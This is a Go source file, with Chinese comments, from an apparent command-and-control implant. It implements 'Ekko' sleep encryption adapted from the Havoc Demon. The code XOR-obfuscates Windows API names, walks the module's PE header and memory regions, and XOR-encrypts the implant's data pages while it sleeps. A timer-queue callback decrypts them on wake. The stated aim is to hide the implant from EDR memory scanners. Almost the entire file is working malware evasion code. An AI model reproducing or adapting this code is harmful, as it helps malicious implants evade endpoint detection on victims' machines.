//go:build windows

package evasion

import (
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Ekko Sleep Encryption — 休眠期加密agent模块内存，绕过EDR内存扫描
// 原理：Havoc Demon 的 Ekko 技术（Go适配版）
// 1. 获取当前模块的基址和大小
// 2. 只加密模块范围内的 committed 私有内存页（不影响Go runtime堆/栈）
// 3. 定时器唤醒后解密
//
// 关键修复：页面列表和密钥通过回调参数传递（堆分配），
// 不使用全局变量（全局变量在.data段中会被自身加密）

var (
	encCTQTEkko = []byte{0x3C, 0x0D, 0x1A, 0x1E, 0x0B, 0x1A, 0x2B, 0x16, 0x12, 0x1A, 0x0D, 0x2E, 0x0A, 0x1A, 0x0A, 0x1A, 0x2B, 0x16, 0x12, 0x1A, 0x0D} // CreateTimerQueueTimer
	encWFSOEkko = []byte{0x28, 0x1E, 0x16, 0x0B, 0x39, 0x10, 0x0D, 0x2C, 0x16, 0x11, 0x18, 0x13, 0x1A, 0x30, 0x1D, 0x15, 0x1A, 0x1C, 0x0B}             // WaitForSingleObject
	encCTEEkko  = []byte{0x3C, 0x0D, 0x1A, 0x1E, 0x0B, 0x1A, 0x3A, 0x09, 0x1A, 0x11, 0x0B}                                                             // CreateEvent
	encGMHA     = []byte{0x38, 0x1A, 0x0B, 0x32, 0x10, 0x1B, 0x0A, 0x13, 0x1A, 0x37, 0x1E, 0x11, 0x1B, 0x13, 0x1A, 0x3E}                               // GetModuleHandleA
)

// ekkoCtx 堆分配的Ekko上下文，通过回调参数传递
// 关键：不在.data段中，不会被自身加密破坏
type ekkoCtx struct {
	encKey byte
	pages  []ekkoPageInfo
	woken  uint32
	event  windows.Handle
}

type ekkoPageInfo struct {
	addr       uintptr
	size       uintptr
	oldProtect uint32
}

// EkkoSleep 休眠期间加密植入体模块内存
// 此函数阻塞 duration，期间模块内存被XOR加密，EDR扫描器只能看到密文
func EkkoSleep(d time.Duration) {
	if d <= 0 {
		return
	}

	// 1. 获取当前模块基址和大小
	modBase, modSize := getModuleRange()
	if modBase == 0 || modSize == 0 {
		time.Sleep(d)
		return
	}

	// 2. 堆分配上下文（避免全局变量在.data段被加密）
	ctx := &ekkoCtx{
		encKey: byte(time.Now().UnixNano() & 0xFF),
		pages:  make([]ekkoPageInfo, 0, 64),
	}
	if ctx.encKey == 0 {
		ctx.encKey = 0xAA
	}

	// 3. 加密模块内存页
	encryptModulePages(ctx, modBase, modSize)

	// 4. Timer Queue 唤醒
	k32 := windows.NewLazySystemDLL(xorDec(encK32Sleep, xk))
	createTimerQueueTimer := k32.NewProc(xorDec(encCTQTEkko, xk))
	waitForSingleObject := k32.NewProc(xorDec(encWFSOEkko, xk))
	createEvent := k32.NewProc(xorDec(encCTEEkko, xk))

	ev, _, _ := createEvent.Call(0, 0, 0, 0)
	ctx.event = windows.Handle(ev)

	// 回调通过 lpParameter 接收 ctx 指针
	callback := windows.NewCallback(ekkoTimerCallback)

	var timer uintptr
	createTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&timer)),
		0,
		callback,
		uintptr(unsafe.Pointer(ctx)), // lpParameter -> ctx
		uintptr(d.Milliseconds()),
		0,
		0,
	)

	// 5. 等待唤醒
	waitForSingleObject.Call(uintptr(ctx.event), 0xFFFFFFFF)
	windows.CloseHandle(ctx.event)

	// 6. 安全解密（如果回调未触发，这里兜底）
	if ctx.woken == 0 {
		decryptModulePages(ctx)
	}
}

// ekkoTimerCallback 定时器回调：解密模块内存
func ekkoTimerCallback(param uintptr, timerOrWaitFired byte) uintptr {
	ctx := (*ekkoCtx)(unsafe.Pointer(param))
	if ctx == nil {
		return 0
	}
	decryptModulePages(ctx)
	windows.SetEvent(ctx.event)
	ctx.woken = 1
	return 0
}

// getModuleRange 获取当前进程主模块的基址和大小
func getModuleRange() (base uintptr, size uintptr) {
	k32 := windows.NewLazySystemDLL(xorDec(encK32Sleep, xk))
	proc := k32.NewProc(xorDec(encGMHA, xk))
	hMod, _, _ := proc.Call(0)
	if hMod == 0 {
		return 0, 0
	}
	base = hMod

	peHeaderOffset := *(*uint32)(unsafe.Pointer(base + 0x3C))
	optHeader := base + uintptr(peHeaderOffset) + 4 + 20
	magic := *(*uint16)(unsafe.Pointer(optHeader))
	var imageSizeOffset uintptr
	if magic == 0x20B {
		imageSizeOffset = 0x38
	} else {
		imageSizeOffset = 0x38
	}
	size = uintptr(*(*uint32)(unsafe.Pointer(optHeader + imageSizeOffset)))
	return base, size
}

// encryptModulePages 加密模块范围内的所有 committed 私有内存页
func encryptModulePages(ctx *ekkoCtx, modBase, modSize uintptr) {
	addr := modBase
	end := modBase + modSize

	for addr < end {
		var mbi windows.MemoryBasicInformation
		ret, _, _ := windows.NewLazySystemDLL(xorDec(encNTDll, xk)).NewProc("NtQueryVirtualMemory").Call(
			uintptr(0xFFFFFFFFFFFFFFFF),
			addr,
			0,
			uintptr(unsafe.Pointer(&mbi)),
			unsafe.Sizeof(mbi),
			0,
		)
		if ret != 0 {
			break
		}

		if mbi.State == windows.MEM_COMMIT &&
			mbi.RegionSize > 0 &&
			mbi.BaseAddress >= modBase &&
			mbi.BaseAddress < end {

			// 跳过可执行页（.text），只加密数据页
			if mbi.Protect&0xF0 != 0 {
				addr = mbi.BaseAddress + mbi.RegionSize
				continue
			}

			regionAddr := mbi.BaseAddress
			regionSize := mbi.RegionSize

			if regionAddr < modBase {
				diff := modBase - regionAddr
				regionAddr = modBase
				regionSize -= diff
			}
			if regionAddr+regionSize > end {
				regionSize = end - regionAddr
			}

			page := ekkoPageInfo{
				addr:       regionAddr,
				size:       regionSize,
				oldProtect: mbi.Protect,
			}

			var oldProtect uint32
			windows.VirtualProtect(regionAddr, regionSize, windows.PAGE_READWRITE, &oldProtect)

			data := unsafe.Slice((*byte)(unsafe.Pointer(regionAddr)), regionSize)
			for i := range data {
				data[i] ^= ctx.encKey
			}

			windows.VirtualProtect(regionAddr, regionSize, mbi.Protect, &oldProtect)
			ctx.pages = append(ctx.pages, page)
		}

		addr = mbi.BaseAddress + mbi.RegionSize
	}
}

// decryptModulePages 解密所有加密的模块内存页
func decryptModulePages(ctx *ekkoCtx) {
	for _, page := range ctx.pages {
		var oldProtect uint32
		windows.VirtualProtect(page.addr, page.size, windows.PAGE_READWRITE, &oldProtect)

		data := unsafe.Slice((*byte)(unsafe.Pointer(page.addr)), page.size)
		for i := range data {
			data[i] ^= ctx.encKey
		}

		windows.VirtualProtect(page.addr, page.size, page.oldProtect, &oldProtect)
	}
	ctx.pages = ctx.pages[:0]
}
